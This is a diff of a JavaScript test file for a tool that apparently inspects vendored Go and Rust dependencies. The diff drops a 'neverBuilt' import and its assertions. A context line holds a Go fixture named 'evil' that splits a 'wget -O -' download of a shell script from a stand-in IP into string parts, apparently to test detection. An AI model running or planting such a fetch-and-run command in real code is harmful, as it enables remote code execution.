@@ -14,7 +14,6 @@ import { join, dirname } from "node:path";
 import { run } from "../src/index.js";
 import { crateLayout } from "../src/deps.js";
 import { vendorKind } from "../src/lib/fs.js";
-import { neverBuilt } from "../src/lib/collect.js";
 import { cargoLayout, goVendoredModules } from "../src/lib/native.js";
 
 const INIT_GO = 'package evil\n\nimport "os/exec"\n\nvar parts = []string{"wget", " -O - ", "https://203.0.113.7/a.sh", ' +
@@ -127,10 +126,7 @@ test("the helpers: a vendor tree's kind, what is never built, a manifest's layou
   } finally {
     rmSync(root, { recursive: true, force: true });
   }
-  for (const [kind, rel, want] of [["go", "a/b_test.go", true], ["go", "a/testdata/x.go", true], ["go", "a/_x.go", true],
-    ["go", "a/b.go", false], ["crate", "tests/t.rs", true], ["crate", "src/tests/t.rs", false], ["x", "tests/t.rs", false]]) {
-    assert.equal(neverBuilt(kind, rel), want, `${kind} ${rel}`);
-  }
+  // (never_built: the engine's, collect.rs and its tests)
   assert.deepEqual(cargoLayout('[package]\nbuild = false\n[lib]\npath = "l.rs"\n'), { build: false, lib: "l.rs", proc_macro: null });
   assert.deepEqual(goVendoredModules(MODULES_TXT), ["example.test/evil", "example.test/ok"]);
   const members = ["build.rs", "tools/gen.rs", "src/lib.rs", "src/x.rs"];
